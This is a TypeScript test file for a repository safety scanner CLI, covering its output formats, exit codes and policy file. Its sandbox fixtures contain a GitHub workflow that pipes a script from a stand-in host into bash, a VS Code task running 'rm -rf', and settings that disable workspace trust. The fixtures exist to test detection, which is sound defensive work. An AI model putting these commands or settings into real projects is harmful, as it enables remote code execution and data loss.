import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import {
  parseRepositoryScanCliArgs,
  runRepositoryScanCli,
  type RepositorySafetyScanResult
} from "../src";
import { cleanupWorkspaceSandboxes, createWorkspaceSandbox } from "./helpers/workspaceSandbox";

async function writeRepoFile(rootPath: string, relativePath: string, content: string): Promise<void> {
  const targetPath = path.join(rootPath, relativePath);
  await mkdir(path.dirname(targetPath), { recursive: true });
  await writeFile(targetPath, content, "utf8");
}

afterEach(async () => {
  await cleanupWorkspaceSandboxes();
});

describe("repository scan CLI", () => {
  it("parses profile and fail-on options", () => {
    const args = parseRepositoryScanCliArgs(["--format", "json", "--profile", "restricted", "--fail-on", "high", "."]);

    expect(args.format).toBe("json");
    expect(args.profile).toBe("restricted");
    expect(args.failOn).toBe("high");
  });

  it("emits aggregated JSON output and exit codes", async () => {
    const rootPath = await createWorkspaceSandbox("workspace-guard-cli");
    await writeRepoFile(rootPath, ".github/workflows/release.yml", `name: release
on:
  pull_request_target:
jobs:
  ship:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.invalid/install.sh | bash
`);
    await writeRepoFile(rootPath, ".vscode/tasks.json", `{
  "tasks": [
    { "label": "bootstrap", "type": "shell", "command": "rm -rf tmp" }
  ]
}
`);

    let output = "";
    const exitCode = await runRepositoryScanCli([
      "--format", "json",
      "--fail-on", "high",
      rootPath
    ], {
      stdout: {
        write: (chunk: string) => {
          output += chunk;
          return true;
        }
      }
    });

    const report = JSON.parse(output) as RepositorySafetyScanResult;
    const sources = new Set(report.findings.map((finding) => finding.source));

    expect(exitCode).toBe(1);
    expect(sources).toEqual(new Set(["github", "config"]));
    expect(report.summary.highFindings).toBeGreaterThan(0);
  });

  it("supports advisory runs with fail-on none", async () => {
    const rootPath = await createWorkspaceSandbox("workspace-guard-cli");
    await writeRepoFile(rootPath, ".vscode/settings.json", `{
  "task.allowAutomaticTasks": "on"
}
`);

    const exitCode = await runRepositoryScanCli(["--fail-on", "none", rootPath], {
      stdout: {
        write: () => true
      }
    });

    expect(exitCode).toBe(0);
  });

  it("applies repository policy defaults and supports SARIF output", async () => {
    const rootPath = await createWorkspaceSandbox("workspace-guard-cli");
    await writeRepoFile(rootPath, ".workspace-guard/policy.jsonc", `{
  "version": 1,
  "profile": "restricted",
  "failOn": "high",
  "findingAllowList": ["WG-CFGSET-001"]
}
`);
    await writeRepoFile(rootPath, ".vscode/settings.json", `{
  "task.allowAutomaticTasks": "on",
  "security.workspace.trust.enabled": false
}
`);

    let output = "";
    const exitCode = await runRepositoryScanCli(["--format", "sarif", rootPath], {
      stdout: {
        write: (chunk: string) => {
          output += chunk;
          return true;
        }
      }
    });

    const sarif = JSON.parse(output) as { runs: Array<{ results: Array<{ ruleId: string }> }> };
    const ruleIds = sarif.runs[0]?.results.map((entry) => entry.ruleId) ?? [];

    expect(exitCode).toBe(1);
    expect(ruleIds).not.toContain("WG-CFGSET-001");
    expect(ruleIds).toContain("WG-CFGSET-002");
  });
});